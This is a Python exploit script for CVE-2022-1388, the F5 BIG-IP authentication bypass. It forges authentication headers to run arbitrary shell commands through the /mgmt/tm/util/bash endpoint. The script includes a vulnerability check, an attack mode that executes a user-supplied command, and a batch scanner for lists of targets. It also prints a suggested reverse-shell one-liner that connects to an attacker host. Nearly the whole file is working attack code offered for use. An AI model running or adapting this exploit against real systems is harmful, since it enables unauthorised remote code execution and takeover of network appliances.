#!/usr/bin/python3.9
# -*- coding: utf-8 -*-
# CVE 2022-1388 F5 Exploit
# Translated by: Google & ZephrFish
# Removed reverse shell option and merged into main function

import requests
import sys
import argparse
import json
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

t = int(time.time())

# Colour Functions
def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))

def title():
    print('''
     _____  _   _  _____        _____  _____  _____  _____        __   _____  _____  _____ 
    /  __ \| | | ||  ___|      / __  \|  _  |/ __  \/ __  \      /  | |____ ||  _  ||  _  |
    | /  \/| | | || |__  ______`' / /'| |/' |`' / /'`' / /'______`| |     / / \ V /  \ V / 
    | |    | | | ||  __||______| / /  |  /| |  / /    / / |______|| |     \ \ / _ \  / _ \ 
    | \__/\\ \_/ /| |___       ./ /___\ |_/ /./ /___./ /___      _| |_.___/ /| |_| || |_| |
     \____/ \___/ \____/       \_____/ \___/ \_____/\_____/      \___/\____/ \_____ \_____/                                                                                                                                                                                                                                                          
                                                      
    ''')
    print('''
    CVE-2022-1388 F5 Exploit
    Usage:
            Check Hosts: python3 CVE-2022-1388.py -v true -u target_url
            Exploit Host: python3 CVE_2022_1388.py -a true -u target_url -c command 
            Exploit List: python3 CVE_2022_1388.py -s true -f file
        ''')


def headers():
    headers = {
        "Host": "127.0.0.1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36",
        'Content-Type': 'application/json',
        'Connection': 'keep-alive, x-F5-Auth-Token',
        'X-F5-Auth-Token': 'a',
        'Authorization': 'Basic YWRtaW46'
    }
    return headers


def check(target_url):
    check_url = target_url + '/mgmt/tm/util/bash'
    data = {'command': "run", 'utilCmdArgs': "-c id"}
    try:
        response = requests.post(url=check_url, json=data, headers=headers(), verify=False, timeout=5)
        if response.status_code == 200 and 'commandResult' in response.text:
           prGreen("[+] Target {} Vulnerable".format(target_url))
        else:
            prRed("[-] Target {} Not Vulnerable".format(target_url))
    except Exception as e:
        prYellow('url access exception {0}'.format(target_url))


def attack(target_url, cmd):
    attack_url = target_url + '/mgmt/tm/util/bash'
    data = {'command': "run", 'utilCmdArgs': "-c '{0}'".format(cmd)}
    try:
        response = requests.post(url=attack_url, json=data, headers=headers(), verify=False, timeout=5)
        if response.status_code == 200 and 'commandResult' in response.text:
            default = json.loads(response.text)
            display = default['commandResult']
            prGreen("[+] Target {} Vulnerable".format(target_url))
            print("suggested command for a reverse shell!: bash -i >&/dev/tcp/ATTACKERHOST/attackerport 0>&1")
            print('[+] Response:{0}'.format(display))
        else:
            prRed("[-] Target {} Not Vulnerable".format(target_url))
    except Exception as e:
        prYellow('url exception {0}'.format(target_url))


def scan(file):
    for url_link in open(file, 'r', encoding='utf-8'):
        if url_link.strip() != '':
            url_path = format_url(url_link.strip())
            check(url_path)


def format_url(url):
    try:
        if url[:4] != "http":
            url = "https://" + url
            url = url.strip()
        return url
    except Exception as e:
        prYellow('URL Incorrect {0}'.format(url))


def main():
    parser = argparse.ArgumentParser("F5 Big-IP RCE")
    parser.add_argument('-v', '--verify', type=bool, help=' check target is vulnerable ')
    parser.add_argument('-u', '--url', type=str, help=' TargetURL ')

    parser.add_argument('-a', '--attack', type=bool, help=' attack mode ')
    parser.add_argument('-c', '--command', type=str, default="id", help=' command to execute on remote host ')

    parser.add_argument('-s', '--scan', type=bool, help=' Batch Identification, supply a file with target hosts ')
    parser.add_argument('-f', '--file', type=str, help=' path to file containing target hosts')

    args = parser.parse_args()

    verify_model = args.verify
    url = args.url

    attack_model = args.attack
    command = args.command

    scan_model = args.scan
    file = args.file

    if verify_model is True and url is not None:
        check(url)
    elif attack_model is True and url is not None and command is not None:
        attack(url, command)
    elif scan_model is True and file is not None:
        scan(file)
    else:
        sys.exit(0)


if __name__ == '__main__':
    title()
    main()
